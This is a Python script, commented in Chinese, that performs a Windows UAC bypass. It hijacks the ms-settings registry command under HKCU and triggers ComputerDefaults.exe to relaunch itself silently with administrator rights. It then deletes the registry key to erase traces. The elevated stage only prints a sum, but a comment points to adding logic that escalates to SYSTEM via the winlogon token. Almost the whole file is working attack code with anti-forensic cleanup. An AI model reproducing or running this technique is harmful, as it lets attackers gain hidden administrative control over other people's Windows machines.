import os
import sys
import winreg
import time
import subprocess
import ctypes

def computer_defaults_bypass():
    """ 階段 1：靜默繞過 UAC 並啟動一個具備管理員權限的自己 """
    reg_path = r"Software\Classes\ms-settings\Shell\Open\command"


    
    # 獲取當前腳本的絕對路徑
    script_path = os.path.abspath(sys.argv[0])
    # 構造指令：啟動 python 執行本腳本，並加上 --elevated 參數
    # 使用 cmd.exe /k 是為了讓新視窗保持開啟，方便你看結果
    # elevated_cmd = f'cmd.exe /k python "{script_path}" --elevated'

    # 1. 獲取當前 Python 解釋器與腳本的絕對路徑
    python_exe = sys.executable
    script_path = os.path.abspath(sys.argv[0])

    # 2. 關鍵修正：確保 cmd /k 後面的指令用引號包起來，且路徑內部也包起來
    # 最終指令看起來會像這樣：cmd.exe /k ""C:\path\to\python.exe" "C:\path\to\script.py" --elevated"
    elevated_cmd = f'cmd.exe /k ""{python_exe}" "{script_path}" --elevated"'

    try:
        # 1. 寫入劫持註冊表
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.SetValueEx(key, None, 0, winreg.REG_SZ, elevated_cmd)
        winreg.CloseKey(key)

        print("[*] 正在透過 ComputerDefaults 請求靜默提權...")
        subprocess.Popen(["C:\\Windows\\System32\\ComputerDefaults.exe"], shell=True)
        
        # 2. 清理（稍微延遲確保 ComputerDefaults 讀取完畢）
        time.sleep(3)
        subprocess.run(['reg', 'delete', 'HKCU\\Software\\Classes\\ms-settings', '/f'], capture_output=True)
        print("[+] 註冊表痕跡已清理，請查看新視窗。")
        
    except Exception as e:
        print(f"[-] Bypass 失敗: {e}")

def add():
    """ 階段 2：在高權限視窗中執行的功能 """
    print("\n" + "="*40)
    print(" [!] 成功：目前在新視窗（管理員權限）運行")
    print("="*40)
    
    x = 1
    y = 2
    print(f"計算結果：The sum of {x} and {y} is {x + y}")
    
    # 你可以繼續在這裡放入之前的 new.py 邏輯 (提權到 SYSTEM)
    # 只要在管理員視窗內，就能成功鎖定 winlogon 令牌

if __name__ == "__main__":
    # 檢查命令行參數中是否有我們自定義的標記
    if "--elevated" in sys.argv:
        # 如果有標記，說明這是被提權後啟動的「分身」
        add()
    else:
        # 如果沒有標記，說明這是使用者第一次點擊，執行 Bypass 流程
        print("[*] 啟動環境：普通權限")
        computer_defaults_bypass()